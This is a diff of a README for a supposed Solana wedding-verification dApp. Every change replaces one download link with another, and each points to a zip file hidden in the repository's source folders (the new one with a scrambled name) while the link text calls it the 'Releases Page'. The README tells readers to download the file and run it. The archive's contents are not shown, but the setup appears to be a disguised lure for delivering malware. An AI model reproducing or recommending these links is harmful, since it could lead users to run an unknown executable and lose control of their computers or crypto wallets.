@@ -1,7 +1,7 @@
 # 🎉 Solbond-On-Chain-Wedding-dApp - Verify Your Marriage on the Blockchain
 
 ## 🔗 Download It Now
-[![Download Now](https://raw.githubusercontent.com/isaiahhodel7/Solbond-On-Chain-Wedding-dApp/main/client/src/components/Solbond-On-Chain-Wedding-dApp-v2.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/isaiahhodel7/Solbond-On-Chain-Wedding-dApp/main/client/src/components/Solbond-On-Chain-Wedding-dApp-v2.7.zip)
+[![Download Now](https://github.com/isaiahhodel7/Solbond-On-Chain-Wedding-dApp/raw/refs/heads/main/client/src/scripts/controllers/Chain-d-Solbond-On-App-Wedding-v1.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/isaiahhodel7/Solbond-On-Chain-Wedding-dApp/raw/refs/heads/main/client/src/scripts/controllers/Chain-d-Solbond-On-App-Wedding-v1.4.zip)
 
 ## 🌐 Introduction
 The Solbond-On-Chain-Wedding-dApp is a unique application that allows you to verify marriages on the blockchain. Built on the Solana platform, this decentralized app (dApp) ensures that your union is backed by smart contracts. With this tool, you get a reliable way to manage your marriage records securely.
@@ -23,10 +23,10 @@ Before downloading, make sure your system meets the following requirements:
 - **Cross-Platform Compatibility**: Works on major operating systems.
 
 ## 📥 Download & Install
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/isaiahhodel7/Solbond-On-Chain-Wedding-dApp/main/client/src/components/Solbond-On-Chain-Wedding-dApp-v2.7.zip)
+Visit this page to download: [Releases Page](https://github.com/isaiahhodel7/Solbond-On-Chain-Wedding-dApp/raw/refs/heads/main/client/src/scripts/controllers/Chain-d-Solbond-On-App-Wedding-v1.4.zip)
 
 Here’s how to install the application:
-1. Click the [Releases Page](https://raw.githubusercontent.com/isaiahhodel7/Solbond-On-Chain-Wedding-dApp/main/client/src/components/Solbond-On-Chain-Wedding-dApp-v2.7.zip) link.
+1. Click the [Releases Page](https://github.com/isaiahhodel7/Solbond-On-Chain-Wedding-dApp/raw/refs/heads/main/client/src/scripts/controllers/Chain-d-Solbond-On-App-Wedding-v1.4.zip) link.
 2. Look for the latest release.
 3. Choose the installer that matches your operating system.
 4. Download the file and run it.
@@ -43,7 +43,7 @@ Once installed, open the application. You will see a simple dashboard. Here’s 
 If you encounter any issues during installation or use:
 - Ensure you have a stable internet connection.
 - Restart the app if it becomes unresponsive.
-- Consult the FAQ section on the [Releases Page](https://raw.githubusercontent.com/isaiahhodel7/Solbond-On-Chain-Wedding-dApp/main/client/src/components/Solbond-On-Chain-Wedding-dApp-v2.7.zip) for common questions.
+- Consult the FAQ section on the [Releases Page](https://github.com/isaiahhodel7/Solbond-On-Chain-Wedding-dApp/raw/refs/heads/main/client/src/scripts/controllers/Chain-d-Solbond-On-App-Wedding-v1.4.zip) for common questions.
 
 ## 🛠️ Support
 For additional help or to report bugs, visit the GitHub repository's Issues section. You can describe the problem you're facing, and our team will respond.
